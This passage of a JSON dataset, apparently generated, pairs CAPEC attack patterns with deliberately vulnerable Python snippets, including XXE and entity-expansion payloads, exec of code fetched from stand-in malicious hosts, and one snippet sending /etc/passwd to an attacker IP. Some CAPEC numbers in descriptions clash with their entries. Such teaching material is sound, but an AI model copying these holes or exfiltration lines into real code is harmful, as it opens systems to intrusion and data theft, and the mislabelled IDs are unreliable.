        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/load_flash', methods=['GET'])\ndef load_flash():\n    flash_url = request.args.get('flash_url')\n    if not flash_url:\n        return 'No flash URL provided', 400\n    # CWE-20: Improper Input Validation\n    if 'http' not in flash_url:\n        return 'Invalid URL', 400\n    # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n    if 'trusted.com' not in flash_url:\n        return 'Untrusted domain', 400\n    # CWE-697: Incorrect Comparison (simplified for demonstration)\n    if flash_url == 'http://trusted.com/malicious.swf':\n        return 'Malicious content detected', 400\n    # CWE-506: Embedded Malicious Code\n    response = requests.get(flash_url)\n    if response.status_code != 200:\n        return 'Failed to load flash content', 500\n    # CWE-184: Incomplete List of Disallowed Inputs\n    if '<script>' in response.text:\n        return 'Disallowed content detected', 400\n    return render_template_string('<embed src=\"{{ flash_url }}\" />', flash_url=flash_url)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application that loads Flash content from a user-specified URL. The main idea of the CAPEC is demonstrated by allowing an attacker to trick a victim into executing malicious Flash content. The code includes several CWE-related weaknesses: CWE-20 (Improper Input Validation) by not thoroughly validating the 'flash_url' parameter, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by allowing URLs from untrusted domains, CWE-697 (Incorrect Comparison) by using a simplistic and incorrect comparison to detect malicious content, CWE-506 (Embedded Malicious Code) by potentially loading and executing malicious Flash content, and CWE-184 (Incomplete List of Disallowed Inputs) by not having a comprehensive list of disallowed inputs. The code's functionality is to fetch and embed Flash content from a given URL, demonstrating how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import imaplib\nimport smtplib\n\n# Simulated user input\nuser_input = \"INBOX; LOGOUT\"\n\n# Vulnerable IMAP command injection\ntry:\n    mail = imaplib.IMAP4_SSL('imap.example.com')\n    mail.login('user@example.com', 'password')\n    mail.select(user_input)  # User input directly used in IMAP command\nexcept Exception as e:\n    print(f\"Error: {e}\")\n\n# Vulnerable SMTP command injection\ntry:\n    server = smtplib.SMTP('smtp.example.com', 587)\n    server.starttls()\n    server.login('user@example.com', 'password')\n    server.sendmail('user@example.com', 'recipient@example.com', f\"Subject: Test\\n\\n{user_input}\")  # User input directly used in SMTP command\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of IMAP and SMTP command handling, which is susceptible to command injection attacks. The user input is directly used in IMAP and SMTP commands without proper sanitization or validation. This can allow an attacker to inject malicious commands. The code also includes basic error handling that could potentially expose sensitive information through error messages. This example embodies the main idea of CAPEC-242 (IMAP/SMTP Command Injection) and highlights related weaknesses such as improper neutralization of special elements (CWE-77), improper encoding or escaping of output (CWE-116), and exposure of information through error messages (CWE-535, CWE-209)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Directly executing the downloaded code without integrity check\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\nsensitive_info = os.popen('cat /etc/passwd').read()\nprint(sensitive_info)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code that sends sensitive information to an attacker\nimport socket\nattacker_ip = '192.168.1.100'\nattacker_port = 4444\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((attacker_ip, attacker_port))\nsock.sendall(sensitive_info.encode('utf-8'))\nsock.close()",
        "description": "This Python code snippet demonstrates a 'Software Integrity Attack' by combining several related CWEs. The code first downloads and executes a Python script from a remote location without verifying its integrity (CWE-494). It then exposes sensitive system information by reading and printing the contents of '/etc/passwd' (CWE-497). Finally, it contains embedded malicious code that sends the sensitive information to an attacker's server (CWE-506). This snippet highlights how an attacker can undermine software integrity and compromise system security by exploiting these vulnerabilities."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious-script.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nif response.status_code == 200:\n    with open('downloaded_script.py', 'wb') as file:\n        file.write(response.content)\n\n    # Execute the downloaded script without verifying its integrity or origin\n    os.system('python downloaded_script.py')\n",
        "description": "This Python code snippet demonstrates a 'Malicious Software Download' attack. It downloads a script from a potentially malicious URL and executes it without performing any integrity checks (CWE-494). The downloaded script could contain embedded malicious code (CWE-506) or act as a Trojan horse (CWE-507), appearing benign but performing harmful actions. This code highlights the risks of downloading and executing code from untrusted sources without proper validation."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\n\n# URL of the malicious update\nmalicious_update_url = 'http://malicious.example.com/update'\n\n# Download the update without integrity check\nresponse = requests.get(malicious_update_url)\n\n# Execute the downloaded code\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a 'Malicious Software Update' attack. The code downloads an update from a specified URL without performing any integrity checks to verify the source or content of the update (CWE-494). The downloaded code is then executed directly, which could contain embedded malicious code (CWE-506) or act as a Trojan horse (CWE-507). This represents a significant security risk as it allows an adversary to execute arbitrary code on the target system."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\n# URL of the update server\nupdate_url = 'http://malicious-server.com/update'\n\n# Function to download and execute update\ndef download_and_execute_update(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            exec(response.text)\n        else:\n            print('Failed to download update')\n    except Exception as e:\n        print(f'Error during update: {e}')\n\n# Download and execute the update without verifying integrity or authenticity\nif __name__ == '__main__':\n    download_and_execute_update(update_url)",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL and executes it without verifying the integrity or authenticity of the downloaded code. This embodies the main idea of CAPEC-494, where an attacker can exploit the lack of proper authentication and integrity checks to introduce malicious code. The code also touches on related CWEs, such as CWE-494 (Download of Code Without Integrity Check) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision), by showing how untrusted input (the update URL) can lead to the execution of potentially malicious code."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import base64\n\n# Simulate sensitive system information\nsensitive_info = 'SensitiveSystemInformation'\n\n# Encode the sensitive information using a weak algorithm (Base64)\nencoded_info = base64.b64encode(sensitive_info.encode()).decode()\n\n# Undocumented feature: Debug mode that exposes sensitive information\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print(f'Debug Info: {encoded_info}')\n\n# Function that could be optimized away by the processor\ndef security_check():\n    # Security-critical code\n    if 'Sensitive' in sensitive_info:\n        return True\n    return False\n\n# Main function\nif __name__ == '__main__':\n    if security_check():\n        print('Security check passed.')\n    else:\n        print('Security check failed.')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. The code simulates sensitive system information and encodes it using a weak cryptographic algorithm (Base64), which is easily reversible (CWE-327). It includes an undocumented feature (DEBUG_MODE) that exposes the encoded sensitive information (CWE-1242). Additionally, the security_check function contains security-critical code that could potentially be optimized away by the processor (CWE-1037). The overall idea represents how reverse engineering can exploit these weaknesses to uncover sensitive information and bypass security mechanisms."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport random\n\n# Simulate a sensitive operation with observable discrepancies\nclass SensitiveOperation:\n    def __init__(self, secret):\n        self.secret = secret\n\n    def check_secret(self, input_secret):\n        # Simulate a time delay based on the correctness of the input\n        if input_secret == self.secret:\n            time.sleep(0.1)  # Correct secret\n            return True\n        else:\n            time.sleep(0.5)  # Incorrect secret\n            return False\n\n# Simulate power consumption monitoring\nclass PowerMonitor:\n    def __init__(self, operation):\n        self.operation = operation\n\n    def monitor_power(self, input_secret):\n        start_time = time.time()\n        result = self.operation.check_secret(input_secret)\n        end_time = time.time()\n        power_consumption = end_time - start_time\n        return power_consumption, result\n\n# Example usage\nsecret = 's3cr3t'\noperation = SensitiveOperation(secret)\nmonitor = PowerMonitor(operation)\n\n# Adversary tries to guess the secret\nfor guess in ['guess1', 'guess2', 's3cr3t']:\n    power, result = monitor.monitor_power(guess)\n    print(f\"Guess: {guess}, Power Consumption: {power:.2f}s, Result: {result}\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary can perform black box reverse engineering by exploiting observable discrepancies and power side-channel attacks. The `SensitiveOperation` class simulates a sensitive operation that checks a secret and introduces different time delays based on whether the input secret is correct or not. The `PowerMonitor` class simulates monitoring the power consumption during the secret check. By observing the time delays (which correlate with power consumption), an adversary can infer information about the secret. This embodies the CAPEC concept of black box reverse engineering and highlights related CWEs such as observable discrepancies (CWE-203) and power side-channel vulnerabilities (CWE-1255)."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import os\nimport requests\n\n# Hidden functionality: Download and execute code from a remote server\n# CWE-912: Hidden Functionality\n# CWE-494: Download of Code Without Integrity Check\n# CWE-506: Embedded Malicious Code\n\n# URL of the remote code (malicious server)\nremote_code_url = 'http://malicious-server.com/malicious_code.py'\n\n# Download the code\nresponse = requests.get(remote_code_url)\n\n# Save the downloaded code to a file\nwith open('downloaded_code.py', 'w') as file:\n    file.write(response.text)\n\n# Execute the downloaded code\nos.system('python downloaded_code.py')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n# This part of the code could expose sensitive information or trace data\nsensitive_data = 'Sensitive system information'\nprint(sensitive_data)\n",
        "description": "This Python code snippet demonstrates a scenario where hidden functionality is embedded within a program. The code downloads and executes a Python script from a remote server without performing any integrity checks, which aligns with CWE-494 (Download of Code Without Integrity Check) and CWE-506 (Embedded Malicious Code). The hidden functionality is not documented or obvious to the user, representing CWE-912 (Hidden Functionality). Additionally, the code prints sensitive system information, which could be exposed to unauthorized actors, aligning with CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) and CWE-1323 (Improper Management of Sensitive Trace Data). This snippet embodies the main idea of reverse engineering an executable to expose assumed hidden functionality."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\n# Hard-coded sensitive constants\nSECRET_KEY = 'hardcoded_secret_key'\nPASSWORD = 'hardcoded_password'\n\n# Function that uses hard-coded credentials\ndef authenticate(user_input):\n    if user_input == PASSWORD:\n        return 'Authenticated'\n    else:\n        return 'Access Denied'\n\n# Function that uses hard-coded security-relevant constant\ndef generate_hash(data):\n    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()\n\n# Example usage\nuser_input = 'user_password'\nprint(authenticate(user_input))\nprint(generate_hash('sensitive_data'))",
        "description": "This Python code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a secret key and a password. The `authenticate` function uses a hard-coded password for authentication, representing CWE-798 (Use of Hard-coded Credentials). The `generate_hash` function uses a hard-coded secret key to generate a hash, representing CWE-547 (Use of Hard-coded, Security-relevant Constants). This code snippet highlights the risks associated with storing sensitive information in cleartext within an executable, making it vulnerable to static and dynamic analysis attacks."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\n\n# Inadequate encryption strength (CWE-326)\ndef weak_encrypt(data):\n    return ''.join(chr(ord(char) + 1) for char in data)  # Simple Caesar cipher\n\n# Cleartext transmission of sensitive information (CWE-319)\ndef send_cleartext_data(data, host, port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(data.encode('utf-8'))\n\n# Selection of less-secure algorithm during negotiation (CWE-757)\ndef negotiate_algorithm(preferred_algorithms):\n    available_algorithms = ['AES', 'DES']  # Assume 'DES' is less secure\n    for alg in preferred_algorithms:\n        if alg in available_algorithms:\n            return alg\n    return 'DES'  # Fallback to less secure algorithm\n\n# Main function demonstrating protocol analysis vulnerability\ndef main():\n    sensitive_data = 'SecretPassword123'\n    encrypted_data = weak_encrypt(sensitive_data)\n    print(f'Encrypted data: {encrypted_data}')\n\n    # Simulate sending data in cleartext\n    send_cleartext_data(sensitive_data, 'example.com', 12345)\n\n    # Simulate algorithm negotiation\n    selected_algorithm = negotiate_algorithm(['AES', 'RSA'])\n    print(f'Selected algorithm: {selected_algorithm}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to protocol analysis. The `weak_encrypt` function uses a simple Caesar cipher, representing inadequate encryption strength (CWE-326). The `send_cleartext_data` function transmits sensitive data in cleartext over a network (CWE-319). The `negotiate_algorithm` function simulates the selection of a less secure algorithm during negotiation (CWE-757). The `main` function ties these elements together, showing how sensitive data can be inadequately protected and transmitted, making it susceptible to protocol analysis attacks."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import requests\n\n# Vulnerable function that includes remote file based on user input\n\ndef include_remote_file(file_url):\n    try:\n        # Fetch the remote file content\n        response = requests.get(file_url)\n        response.raise_for_status()\n        # Execute the remote file content\n        exec(response.text)\n    except requests.RequestException as e:\n        print(f\"Error fetching remote file: {e}\")\n\n# Example usage\nuser_input = 'http://example.com/malicious_code.py'\ninclude_remote_file(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The function `include_remote_file` takes a URL as input, fetches the content from the URL, and executes it using the `exec` function. This is dangerous because it allows an attacker to execute arbitrary code hosted on a remote server. The code does not perform any validation or sanitization of the input URL, making it susceptible to exploitation. This example embodies the main idea of the CAPEC by showing how improper control of input can lead to the execution of malicious code. The related CWEs provide additional context, such as the importance of input validation and the risks of executing untrusted content."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable email sending function\n\ndef send_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # This can be easily spoofed\n    msg['To'] = to_address\n\n    # Connect to the SMTP server\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click this link to update your account.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that allows an attacker to spoof the 'From' address. The function 'send_email' takes in the recipient's email address, the sender's email address, the subject, and the body of the email. It then constructs the email and sends it using an SMTP server. The vulnerability lies in the fact that the 'from_address' parameter is not authenticated, allowing an attacker to send an email that appears to come from a trusted source. This embodies the CAPEC 'Fake the Source of Data' by exploiting CWE-287 (Improper Authentication) and CWE-290 (Authentication Bypass by Spoofing)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1390: Weak Authentication\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Function to send a spoofed email\ndef send_spoofed_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    try:\n        # CWE-322: Key Exchange without Entity Authentication\n        # Establishing a connection to the SMTP server without verifying the server's identity\n        smtp_server = smtplib.SMTP('smtp.example.com')\n        smtp_server.sendmail(from_address, [to_address], msg.as_string())\n        smtp_server.quit()\n        print('Email sent successfully')\n    except Exception as e:\n        print(f'Failed to send email: {e}')\n\n# Example usage\nsend_spoofed_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link to update your account information.')",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending a spoofed email. The function `send_spoofed_email` takes in the recipient's email address, a spoofed sender's email address, a subject, and the body of the email. It constructs the email and sends it using an SMTP server. The code embodies several related CWEs: CWE-290 (Authentication Bypass by Spoofing) and CWE-1390 (Weak Authentication) by not verifying the sender's identity, CWE-941 (Incorrectly Specified Destination in a Communication Channel) by potentially sending the email to an unintended recipient, and CWE-322 (Key Exchange without Entity Authentication) by not verifying the SMTP server's identity. This code represents the main idea of a Principal Spoof attack, where the adversary sends a message that appears to come from a legitimate source to deceive the recipient."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport random\n\n# Weak credentials (CWE-1391)\nSECRET_KEY = 'default_secret_key'\n\n# Function to generate a session token\n# Improper control of resource through its lifetime (CWE-664)\ndef generate_session_token(user_id):\n    timestamp = str(int(time.time()))\n    random_number = str(random.randint(1000, 9999))\n    session_token = hashlib.sha256((user_id + timestamp + random_number + SECRET_KEY).encode()).hexdigest()\n    return session_token\n\n# Function to validate session token\n# Insufficient session expiration (CWE-613)\ndef validate_session_token(session_token, user_id):\n    # This is a simplified example and does not check for expiration\n    for i in range(1000, 10000):\n        test_token = hashlib.sha256((user_id + str(int(time.time())) + str(i) + SECRET_KEY).encode()).hexdigest()\n        if test_token == session_token:\n            return True\n    return False\n\n# Example usage\nuser_id = 'user123'\nsession_token = generate_session_token(user_id)\nprint(f\"Generated session token: {session_token}\")\n\n# Validate the session token\nis_valid = validate_session_token(session_token, user_id)\nprint(f\"Is session token valid? {is_valid}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of session credential generation and validation, embodying the main idea of CAPEC-Session Credential Falsification through Forging. The code uses weak credentials (CWE-1391) by relying on a default secret key. It generates a session token using a combination of user ID, current timestamp, a random number, and the secret key. The validation function attempts to validate the session token but does not check for expiration (CWE-613), making it susceptible to reuse of old tokens. Additionally, the code does not properly control the resource through its lifetime (CWE-664), as it does not invalidate old session tokens. This example highlights how an attacker could potentially forge a valid session token by guessing or calculating the token based on observed patterns."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a recursive XML entity\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"1234567890\" >\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >\n<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >\n<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >\n<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >\n<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >\n<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >\n<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >\n<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >\n<!ENTITY j \"&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;\" >\n]>\n<root>&j;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\nexcept MemoryError as e:\n    print(f\"Memory error: {e}\")",
        "description": "This Python code snippet demonstrates an Exponential Data Expansion attack using XML Entity Expansion (CWE-776). The XML data contains nested entity definitions that expand exponentially, leading to excessive memory and CPU usage when parsed. The code attempts to parse this XML data using the xml.etree.ElementTree module, which can result in a memory error or crash due to the excessive resource demands. This example highlights the vulnerability of allocating resources without limits (CWE-770) and the improper restriction of recursive entity references (CWE-776)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    error_message = request.args.get('msg', '')\n    if not error_message:\n        abort(400)\n    # Vulnerable to XSS\n    return f'<html><body><h1>Error: {error_message}</h1></body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes an error page. The error page displays a user-provided error message, which is retrieved from the query parameter 'msg'. The code is vulnerable to Cross-Site Scripting (XSS) attacks because it directly includes user input in the HTML response without proper sanitization or neutralization of special characters. This embodies the main idea of the CAPEC 'XSS Targeting Error Pages', where an adversary can exploit the lack of input sanitization to inject malicious scripts into the error page. The related CWEs highlight the specific weaknesses, such as improper neutralization of script elements and incomplete denylist mechanisms, that contribute to this vulnerability."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Incomplete denylist to filter out script tags\n    denylist = ['<script>', '</script>']\n    for item in denylist:\n        query = query.replace(item, '')\n    # Render the query directly in the template\n    return render_template_string('<p>Search results for: {{ query }}</p>', query=query)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks due to improper neutralization of alternate XSS syntax. The application has a search endpoint that takes user input from the query parameter. It attempts to filter out script tags using an incomplete denylist, which only includes '<script>' and '</script>'. However, this denylist is insufficient as it does not account for alternate forms of the script tag (e.g., 'ScRiPt'). The filtered input is then directly rendered in an HTML template, making the application susceptible to XSS attacks. This example embodies the main idea of CAPEC-246 (XSS Using Alternate Syntax) and highlights related CWEs such as CWE-87, CWE-80, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import re\n\ndef process_input(user_input):\n    # Input filter removed\n    # if not re.match(r'^[a-zA-Z0-9_]+$', user_input):\n    #     raise ValueError('Invalid input')\n    return user_input\n\n\ndef execute_command(command):\n    # Output filter removed\n    # sanitized_command = re.sub(r'[;&|]', '', command)\n    # return os.system(sanitized_command)\n    return os.system(command)\n\nuser_input = input('Enter your command: ')\ncommand = process_input(user_input)\nexecute_command(command)",
        "description": "This Python code snippet demonstrates the removal of input and output filters, making the application vulnerable to various attacks. The `process_input` function is supposed to validate the user input to ensure it only contains alphanumeric characters and underscores, but the validation code is commented out, allowing any input to pass through. The `execute_command` function is intended to sanitize the command by removing special characters that could be used for command injection, but this sanitization is also commented out. As a result, the application directly executes potentially dangerous commands entered by the user, illustrating the vulnerabilities described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML data\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example of serialized XML data with an external entity reference\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n    <data>&ext;</data>\n</root>\n'''\n\n# Parse the XML data\nroot = parse_xml(xml_data)\n\n# Print the parsed data\nif root is not None:\n    for child in root:\n        print(child.tag, child.text)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The `parse_xml` function uses the `xml.etree.ElementTree` module to parse XML data. The provided `xml_data` contains an external entity reference (`&ext;`) that points to the `/etc/passwd` file. When the XML data is parsed, the external entity is resolved, potentially exposing sensitive information. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), as the XML parser does not restrict external entity references, leading to potential security risks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import requests\n\nclass MaliciousClient:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def bypass_authentication(self):\n        # CWE-603: Use of Client-Side Authentication\n        response = requests.get(self.target_url, headers={'Authorization': 'Bearer fake_token'})\n        return response.text\n\n    def inject_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        payload = {'data': '<script>alert(\"Malicious Code\")</script>'}\n        response = requests.post(self.target_url, data=payload)\n        return response.status_code\n\n    def create_emergent_resource(self):\n        # CWE-1229: Creation of Emergent Resource\n        response = requests.post(self.target_url, data={'resource': 'new_resource'})\n        return response.status_code\n\nif __name__ == '__main__':\n    client = MaliciousClient('http://example.com/api')\n    print(client.bypass_authentication())\n    print(client.inject_malicious_code())\n    print(client.create_emergent_resource())",
        "description": "This Python code snippet demonstrates a malicious client application that interacts with a target service, violating the assumptions the service makes about its clients. The `MaliciousClient` class includes methods that embody several related CWEs:\n\n1. `bypass_authentication`: This method bypasses server-side authentication by sending a fake token in the request header, illustrating CWE-603 (Use of Client-Side Authentication).\n\n2. `inject_malicious_code`: This method sends a payload containing malicious code to the target service, representing CWE-506 (Embedded Malicious Code).\n\n3. `create_emergent_resource`: This method creates a new resource on the server, which could be used by attackers, demonstrating CWE-1229 (Creation of Emergent Resource).\n\nThe main idea of the CAPEC is to show how an adversary can create a client that violates the service's assumptions, potentially leading to security vulnerabilities."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef manipulate_registry(key_path, value_name, new_value):\n    try:\n        # Open the registry key\n        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\n        # Set the new value\n        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, new_value)\n        winreg.CloseKey(registry_key)\n        print(f'Successfully modified {value_name} to {new_value}')\n    except Exception as e:\n        print(f'Failed to modify registry: {e}')\n\n# Example usage\nmanipulate_registry(r'Software\\ExampleApp', 'ConfigValue', 'NewConfig')",
        "description": "This Python code snippet demonstrates how to manipulate Windows Registry information, which aligns with the CAPEC description of 'Manipulate Registry Information'. The function `manipulate_registry` takes a registry key path, a value name, and a new value as arguments. It opens the specified registry key, sets the new value, and then closes the key. This action can be used to modify configuration settings, potentially affecting application behavior or hiding malicious activity. The code also highlights CWE-15 (External Control of System or Configuration Setting) by allowing external input to control registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the new value in cleartext."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\n# Function to fetch sensitive data from a remote server\ndef fetch_sensitive_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Store the sensitive data in a cache (insecurely)\n        cache = response.text\n        return cache\n    else:\n        return None\n\n# URL containing sensitive information\nsensitive_url = 'https://example.com/sensitive-data'\n\n# Fetch and cache the sensitive data\ncached_data = fetch_sensitive_data(sensitive_url)\n\n# Print the cached data (for demonstration purposes)\nprint(cached_data)",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive data fetched from a remote server is stored in a cache without any protection. The `fetch_sensitive_data` function retrieves data from a given URL and stores it in a variable named `cache`. This cache is then printed, representing a scenario where sensitive information is exposed due to improper handling. The code embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, and highlights related CWEs such as CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data). The lack of encryption and insecure caching policy can lead to sensitive data being accessible to unauthorized actors."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import base64\n\n# Hardcoded credentials (CWE-522: Insufficiently Protected Credentials)\nusername = 'admin'\npassword = 'password123'\n\n# Encoding credentials (not secure, just for demonstration)\nencoded_credentials = base64.b64encode(f'{username}:{password}'.encode()).decode()\n\n# Simulating client-side authentication (CWE-603: Use of Client-Side Authentication)\ndef authenticate_client(encoded_creds):\n    # Insecurely checking credentials on the client side\n    if encoded_creds == encoded_credentials:\n        return 'Authenticated'\n    else:\n        return 'Authentication Failed'\n\n# Simulating a network request with hardcoded credentials\nresponse = authenticate_client(encoded_credentials)\nprint(response)\n\n# Vulnerability: An attacker can easily decode the base64 encoded credentials\n# and bypass authentication by replaying the encoded credentials (CWE-294: Authentication Bypass by Capture-replay)\nprint('Decoded credentials:', base64.b64decode(encoded_credentials).decode())",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side authentication with hardcoded credentials. The credentials are encoded using base64, which is not a secure method of protecting sensitive data (CWE-522: Insufficiently Protected Credentials). The authentication check is performed on the client side (CWE-603: Use of Client-Side Authentication), making it easy for an attacker to bypass the authentication by capturing and replaying the encoded credentials (CWE-294: Authentication Bypass by Capture-replay). The code highlights the risks associated with embedding sensitive data in client distributions and performing authentication on the client side."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
